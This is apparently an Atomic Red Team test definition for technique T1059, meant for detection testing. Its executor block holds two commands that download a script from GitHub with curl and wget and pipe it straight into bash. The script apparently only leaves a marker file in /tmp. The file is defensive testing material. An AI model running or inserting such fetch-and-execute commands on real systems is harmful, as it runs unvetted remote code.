    Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

    Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
  supported_platforms:
    - macos
    - linux

  executor:
    name: sh
    command: |
      bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
      bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
